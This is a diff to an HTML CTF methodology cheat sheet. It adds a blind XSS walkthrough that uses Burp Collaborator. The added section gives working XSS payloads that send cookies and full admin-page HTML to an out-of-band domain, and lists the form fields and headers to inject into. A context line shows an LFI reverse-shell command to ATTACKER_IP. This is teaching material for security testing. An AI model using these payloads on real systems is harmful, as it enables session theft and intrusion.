@@ -481,7 +481,7 @@ footer.doc-footer{
 </li>
 <li class="nav-item" data-cat="web">
 <a class="nav-main" href="#1-web-methodology-tools"><span class="dot dot-web"></span>1. WEB — Methodology &amp; Tools</a>
-<ul class="nav-subtree"><li><a class="nav-sub" data-cat="web" href="#lfi-to-shell-walkthrough-php-filter-chain">LFI → Shell Walkthrough: php://filter Chain Generator</a></li></ul>
+<ul class="nav-subtree"><li><a class="nav-sub" data-cat="web" href="#lfi-to-shell-walkthrough-php-filter-chain">LFI → Shell Walkthrough: php://filter Chain Generator</a></li><li><a class="nav-sub" data-cat="web" href="#blind-xss-hunting-with-burp-collaborator">Blind XSS Hunting with Burp Collaborator</a></li></ul>
 </li>
 <li class="nav-item" data-cat="crypto">
 <a class="nav-main" href="#2-cryptography-methodology-tools"><span class="dot dot-crypto"></span>2. CRYPTOGRAPHY — Methodology &amp; Tools</a>
@@ -639,6 +639,63 @@ curl -G "http://target/vulnerable.php" \
   --data-urlencode "c=bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1'"
 </code></pre>
 <p><strong>Testing straight from a browser address bar</strong> (before scripting it) works too — paste the chain after the vulnerable parameter, then append <code>&amp;c=id</code> in the same bar and hit enter; browsers auto-encode most special characters in typed/pasted URLs. Check the raw response via View Page Source (<code>Ctrl+U</code>) rather than the rendered page, since command output often doesn't render visibly in the HTML body. If the chain is long enough to hit address-bar or URL-length limits, switch to curl as in the steps above — it's more reliable once payloads get large, and removes any encoding guesswork entirely.</p>
+<h3 id="blind-xss-hunting-with-burp-collaborator">Blind XSS Hunting with Burp Collaborator</h3>
+<p>Regular XSS testing assumes the payload fires somewhere you're actively looking (your own browser, the response body in front of you). <strong>Blind XSS</strong> is for the much larger set of cases where your payload gets stored and rendered somewhere you can't see directly — an admin dashboard, a support-ticket backend, a log viewer, a moderation queue, an internal analytics tool. Burp Collaborator solves the "how do I know it fired" problem by giving you an out-of-band listener that any JavaScript payload can phone home to, regardless of where or when it executes.</p>
+<pre><code>Blind XSS workflow
+├─ Fire up Collaborator and get a unique payload domain
+│   Burp Suite → Burp menu → Collaborator client (or it's built into the
+│   main Burp window in recent versions) → "Copy to clipboard" gives you a
+│   fresh, unique subdomain like abc123xyz.oastify.com
+├─ Wrap that domain in a payload that calls home when executed — keep it
+│   short and dependency-free since you don't control the execution context
+│   &lt;script src=https://abc123xyz.oastify.com&gt;&lt;/script&gt;
+│   "&gt;&lt;script src=https://abc123xyz.oastify.com&gt;&lt;/script&gt;
+│   &lt;img src=x onerror="fetch('https://abc123xyz.oastify.com')"&gt;
+├─ Fire it into EVERY field that might be read by a human or backend process
+│   later, not just fields that reflect immediately — this is the mindset
+│   shift from regular XSS testing:
+│   ├─ Contact/support forms (name, email, subject, message body)
+│   ├─ User-Agent, Referer, X-Forwarded-For and other headers (some admin
+│   │   panels display raw request logs/headers to staff)
+│   ├─ File upload metadata (filename, EXIF fields, document properties)
+│   ├─ Any field with a plausible "someone will review this later" purpose
+│   │   — order notes, product reviews, profile bios, feedback forms,
+│   │   password-reset "reason" fields, chat/ticket messages
+│   └─ Even fields that appear to fail/reject on the frontend — some apps
+│       still store rejected submissions for manual review
+├─ Wait — blind XSS is asynchronous by nature. An admin might not view the
+│   flagged submission for minutes, hours, or (in a real engagement) days.
+│   Leave Collaborator polling in the background while you work on other
+│   parts of the box/challenge
+└─ Check Collaborator for interactions
+    Burp → Collaborator client → "Poll now" (or it auto-polls) → any hit
+    shows you the interaction type (HTTP/DNS/SMTP), source IP, and full
+    request/response — confirming both that it fired AND what context it
+    fired in (the User-Agent/headers on the callback often reveal whether
+    it was a real admin's browser vs. an automated scanner)
+</code></pre>
+<p><strong>Getting more than "it fired" out of a hit</strong> — a bare <code>&lt;script src=...&gt;</code> only proves execution happened. To actually exfiltrate something useful once you've confirmed the callback works, upgrade the payload to carry data:</p>
+<pre><code>&lt;script&gt;
+fetch('https://abc123xyz.oastify.com/?c=' + encodeURIComponent(document.cookie))
+&lt;/script&gt;
+
+&lt;img src=x onerror="new Image().src='https://abc123xyz.oastify.com/?c='+encodeURIComponent(document.cookie)"&gt;
+
+&lt;script&gt;
+fetch('https://abc123xyz.oastify.com/?html=' + encodeURIComponent(document.documentElement.outerHTML))
+&lt;/script&gt;
+</code></pre>
+<p>Reading the full admin-panel HTML back (last example) is often more valuable in a CTF than the cookie itself — it can reveal internal endpoints, hidden admin functionality, CSRF tokens, or other users' data rendered on that page, all without needing to guess anything about what the admin interface even looks like.</p>
+<p><strong>If Burp Collaborator isn't available/licensed</strong> (Community Edition has a limited public Collaborator server, or you're air-gapped from Burp entirely), free alternatives work the same way:</p>
+<pre><code class="language-bash"># Interactsh (open-source Collaborator equivalent, CLI or self-hostable)
+interactsh-client
+# gives you a unique *.interact.sh (or your own server) domain the same way
+
+# Or a simple hosted alternative for quick manual tests
+# webhook.site — gives you a unique URL instantly, no install needed,
+# shows incoming requests in a browser dashboard in real time
+</code></pre>
+<p>Swap the domain in any of the payloads above for whichever OOB listener you're using — the technique and mindset (fire into every field, wait, check for callbacks) is identical regardless of which tool is generating the listener domain.</p>
 <table>
 <thead><tr><th>Bug class</th><th>Tool / command</th></tr></thead>
 <tbody>
